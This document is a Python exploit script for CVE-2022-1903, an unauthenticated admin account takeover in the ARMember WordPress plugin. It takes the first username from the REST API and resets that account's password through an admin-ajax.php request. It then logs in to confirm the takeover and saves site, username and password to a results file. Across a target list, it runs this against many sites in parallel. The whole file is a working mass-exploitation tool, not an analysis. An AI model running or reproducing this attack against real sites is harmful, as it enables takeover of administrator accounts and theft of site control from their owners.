# @author : biulove0x
# @name   : WP Plugins ARMember Exploiter
from urllib3.exceptions import InsecureRequestWarning
import requests
import re
import argparse
import json
import multiprocessing

print(
'''
###########################################
# @author : biulove0x                     #
# @name   : WP Plugins ARMember Exploiter #
# @cve    : CVE-2022-1903                 #
###########################################
''')

def armember(_target, _timeout=5, _verify=True):
    global _headers, _cookies
    _sessionget = requests.Session()

    def save_result(_result):
        _saved = open('RESULT-WPAR.txt', 'a+')
        _saved.write(_result + '\n')

    try:
        _getuser = _sessionget.get(url=_target + 'wp-json/wp/v2/users/', headers=_headers, allow_redirects=True, verify=_verify, timeout=_timeout)
        _resuser = json.loads(_getuser.text)
        _fonuser = _resuser[0]['slug']
        _payload = 'action=arm_shortcode_form_ajax_action&user_pass=h4nzou000&repeat_pass=h4nzou000&arm_action=change-password&key2=x&action2=rp&login2=' + _fonuser

        _exploit = _sessionget.post(url=_target + 'wp-admin/admin-ajax.php', headers=_headers, data=_payload, allow_redirects=True, verify=_verify, timeout=_timeout)
        if _exploit.status_code == 200:
            # Try login
            _datalog = {'log': _fonuser, 'pwd': 'h4nzou000', 'wp-submit': 'Login', 'redirect_to': _target + 'wp-admin/', 'testcookie': 1}
            _validationLogin = _sessionget.post(url=_target + 'wp-login.php', data=_datalog, cookies=_cookies, allow_redirects=True, verify=_verify)
            if 'wp-admin/profile.php' in _validationLogin.text:
                print('[-] ' + _target + 'wp-admin/ => Success')
                save_result(_target + 'wp-login.php > ' + _fonuser + ' | h4nzou000')
            else:
                print('[+] ' + _target + ' Not found!')
    except:
        print('[%] ' + _target + ' Requests failed')

def main(_choose, _target, _processes):
    if _choose == 1:
        armember(_target, _verify=False)

    elif _choose == 2:
        pool = multiprocessing.Pool(processes=_processes)
        _ur_list = open(_target, 'r').read().split()

        for _url in _ur_list:
            pool.apply_async(armember, args=(_url,), kwds={'_verify': False})

        pool.close()
        pool.join()

    else:
        exit()

## SSL Bypass
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

## Setup args
_parser = argparse.ArgumentParser(description='CVE-2022-1903 [ ARMember < 3.4.8 - Unauthenticated Admin Account Takeover ]')
_parser.add_argument('-t', metavar='example.com', type=str, help='Single target')
_parser.add_argument('-l', metavar='target.txt', type=str, help='Multiple target')
_parser.add_argument('-p', metavar='10', type=int, help='Number of processes')
_args = _parser.parse_args()

## Variable args
_singleTarget = _args.t
_multiTarget = _args.l
_processes = _args.p if _args.p else 1

## Variable
_cookies = {'wordpress_test_cookie': 'WP+Cookie+check'}
_headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'}

if __name__ == '__main__':
    if _singleTarget is not None:
        _choose = 1
        main(_choose, _singleTarget, _processes)
    elif _multiTarget is not None:
        _choose = 2
        main(_choose, _multiTarget, _processes)
    else:
        print('ARMember.py --help for using tools')
